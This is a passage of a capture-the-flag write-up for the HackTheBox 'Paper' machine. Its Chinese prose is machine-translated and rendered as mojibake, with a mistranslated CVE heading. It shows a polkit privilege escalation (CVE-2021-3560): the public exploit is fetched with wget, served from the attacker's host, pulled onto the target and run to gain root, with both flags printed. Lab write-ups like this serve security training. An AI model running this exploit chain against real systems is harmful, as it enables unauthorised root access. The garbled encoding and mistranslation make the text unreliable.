ks ka kt kc ku kd kv kw bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="0147" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">åœ¨æˆ‘ä»¬å››å¤„çœ‹çœ‹ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆçœ‹çœ‹ç”¨æˆ·æ ‡å¿—:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e5b9" class="nn kg iq nj b gy no np l nq nr">[dwight@paper ~]$ cat user.txt <br/>dfb5f17e111d79a99eeaf8cca1f17188</span></pre><h1 id="894c" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">CVE-2021å¹´è‡³3560å¹´</h1><p id="c49e" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">çœ‹äº†ä¸€ä¼šå„¿ä¹‹åï¼Œæˆ‘å‘ç°è¿™ä¸ªç›’å­ä¸Šçš„rootè·¯å¾„å¾ˆæœ‰è¶£ã€‚ä¹Ÿè®¸æˆ‘é”™è¿‡äº†ä¸€ä¸ªçº¿ç´¢æˆ–æ²¡æœ‰éµå¾ªé¢„æœŸçš„è·¯å¾„ï¼Œä½†æˆ‘å‘ç°CVE-2021â€“3560ï¼Œè¿™æ˜¯å¦ä¸€ä¸ªpolkitåˆ©ç”¨å·¥ä½œã€‚</p><p id="ddb2" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">polkitçš„æ˜“å—æ”»å‡»ç‰ˆæœ¬åœ¨<a class="ae nu" href="https://access.redhat.com/security/vulnerabilities/RHSB-2022-001" rel="noopener ugc nofollow" target="_blank">è¯¥è„šæœ¬</a>ä¸­åˆ—å‡ºã€‚æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åŒ…è£…ç›’ä¸Šçš„ç‰ˆæœ¬:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2231" class="nn kg iq nj b gy no np l nq nr">[dwight@paper ~]$ pkaction --version <br/>pkaction version 0.115</span></pre><p id="668f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä»RedHatåˆ—è¡¨ä¸­æˆ‘ä»¬çŸ¥é“è¿™æ˜¯æ˜“å—æ”»å‡»çš„ã€‚æˆ‘åœ¨GitHubä¸Šæœç´¢ï¼Œå‘ç°äº†<a class="ae nu" href="https://github.com/Almorabea/Polkit-exploit" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ¼æ´ã€‚åˆ‡æ¢åˆ°Kaliå¹¶æŠ“ä½å®ƒ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="baca" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py<br/>--2022-02-07 17:12:37--  https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py<br/>Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.13...<br/>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 2434 (2.4K) [text/plain]<br/>Saving to: â€˜CVE-2021-3560.pyâ€™<br/>CVE-2021-3560.py  100%[=====================================================&gt;]   2.38K  --.-KB/s    in 0s<br/>2022-02-07 17:12:37 (7.27 MB/s) - â€˜CVE-2021-3560.pyâ€™ saved [2434/2434]</span></pre><p id="ffa6" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨Kaliä¸Šå¯åŠ¨ä¸€ä¸ªç½‘ç»œæœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠæ–‡ä»¶æ‹‰è¿‡æ¥:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="216e" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/paper]<br/>â””â”€# python3 -m http.server 80<br/>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></pre><p id="1829" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åˆ‡æ¢åˆ°ç›’å­ï¼Œå°†æ¼æ´æ‹‰è¿‡æ¥:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d7c1" class="nn kg iq nj b gy no np l nq nr">[dwight@paper ~]$ wget http://10.10.14.12/CVE-2021-3560.py<br/>--2022-02-07 12:15:21--  http://10.10.14.12/CVE-2021-3560.py<br/>Connecting to 10.10.14.12:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 2434 (2.4K) [text/x-python]<br/>Saving to: â€˜CVE-2021-3560.pyâ€™<br/>CVE-2021-3560.py   100%[======&gt;]   2.38K  --.-KB/s    in 0s      <br/>2022-02-07 12:15:21 (138 MB/s) - â€˜CVE-2021-3560.pyâ€™ saved [2434/2434]</span></pre><h1 id="9adb" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æ ¹æ ‡å¿—</h1><p id="b707" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">ç°åœ¨è¿è¡Œæ¼æ´æ”»å‡»æˆä¸ºè¶…çº§ç”¨æˆ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="35fb" class="nn kg iq nj b gy no np l nq nr">[dwight@paper ~]$ python3 CVE-2021-3560.py <br/>**************<br/>Exploit: Privilege escalation with polkit - CVE-2021-3560<br/>Exploit code written by Ahmad Almorabea @almorabea<br/>Original exploit author: Kevin Backhouse <br/>For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/<br/>**************<br/>[+] Starting the Exploit <br/>id: â€˜ahmedâ€™: no such user<br/>id: â€˜ahmedâ€™: no such user<br/>id: â€˜ahmedâ€™: no such user<br/>[+] User Created with the name of ahmed<br/>[+] Timed out at: 0.008090460803153968<br/>/org/freedesktop/Accounts/User1005<br/>[+] Timed out at: 0.008392264349843527<br/>[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root <br/>We trust you have received the usual lecture from the local System<br/>Administrator. It usually boils down to these three things:<br/>    #1) Respect the privacy of others.<br/>    #2) Think before you type.<br/>    #3) With great power comes great responsibility.<br/>bash: cannot set terminal process group (4354): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>[root@paper dwight]#</span></pre><p id="a349" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¾ˆç®€å•ï¼Œæˆ‘ä»¬æ˜¯æ ¹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="bc1b" class="nn kg iq nj b gy no np l nq nr">[root@paper dwight]# id<br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="95f8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è®©æˆ‘ä»¬æŠ“ä½æ——å­æ¥å®Œæˆç›’å­:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f8cb" class="nn kg iq nj b gy no np l nq nr">[root@paper dwight]# cat /root/root.txt<br/>8d8bc5dac670529de3817ee328ce64a7</span></pre><p id="f5e0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å®Œæˆäº†ã€‚ä¸‹æ¬¡è§</p></div><div class="ab cl oa ob hu oc" role="separator"><span class="od bw bk oe of og"/><span class="od bw bk oe of og"/><span class="od bw bk oe of"/></div><div class="ij ik il im in"><p id="7621" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="5436" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ¨ç‰¹â€”ã€https://twitter.com/pencer_ioã€‘T4<br/>ç½‘ç«™â€” <a class="ae nu" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="5b70" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="oh">åŸè½½äº2022å¹´6æœˆ18æ—¥</em><a class="ae nu" href="https://pencer.io/ctf/ctf-htb-paper/" rel="noopener ugc nofollow" target="_blank"><em class="oh">https://pencer . io</em></a><em class="oh">ã€‚</em></p></div></div>    
</body>
</html>